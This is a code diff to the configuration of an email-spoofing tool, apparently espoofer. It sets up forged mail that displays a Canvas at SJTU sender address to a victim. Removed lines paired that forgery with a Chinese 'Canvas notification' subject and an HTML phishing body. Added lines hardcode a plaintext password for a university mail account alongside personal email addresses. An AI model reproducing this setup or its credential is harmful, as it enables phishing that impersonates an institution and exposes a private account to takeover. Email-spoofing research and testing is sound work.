@@ -7,19 +7,16 @@ def read_mail(file = 'mail.txt'):
 
 	return str.encode()
 
-def load_password(n = 1):
+def load_password():
     with open('password.txt', 'r') as f:
-        for _ in range(n):
-            password = f.readline()
-        f.close()
+        password = f.read()
     return password.encode() 
 
 
-# sjtu to sjtu with client3
 config = {
-	"attacker_site": b"qq.com", # attack.com
-	"legitimate_site_address": b'"Canvas @SJTU" <canvas@sjtu.edu.cn>', # From header address displayed to the end-user
-	"victim_address": b"2097118786@qq.com", # RCPT TO and message.To header address, 
+	"attacker_site": b"sjtu.edu.cn", # attack.com
+	"legitimate_site_address": b'canvas@sjtu.edu.cn', # From header address displayed to the end-user
+	"victim_address": b"dantynoel@88.com", # RCPT TO and message.To header address, 
 	"case_id": b"client_2", #  You can find all case_id using -l option.
 
 	# The following fields are optional
@@ -29,18 +26,20 @@ config = {
 		"starttls": False,
 	},
 	"client_mode": {
-		"sending_server": ("smtp.qq.com", 587),
-		"username": b"419768539@qq.com",
-		"password": load_password(),
+		"sending_server": ("mail.sjtu.edu.cn", 25),
+		"username": b"dantynoel@sjtu.edu.cn",
+		"password": b"Ars1027ars",
 	},
 
 	# Optional. You can leave them empty or customize the email message header or body here
-	"subject_header": "Subject: 最近 Canvas 通知\r\n".encode(),  # Subject: Test espoofer\r\n
-	"to_header": b"To: dantynoel@sjtu.edu.cn\r\n", # To: <alice@example.com>\r\n
-	"body": read_mail('canvas_notification.html'), # Test Body.
+	"subject_header": b"",  # Subject: Test espoofer\r\n
+	"to_header": b"", # To: <alice@example.com>\r\n
+	"body": b"", # Test Body.
 
 	# Optional. Set the raw email message you want to sent. It's usually used for replay attacks
 	"raw_email": b"", 
 }
+
+
 
 
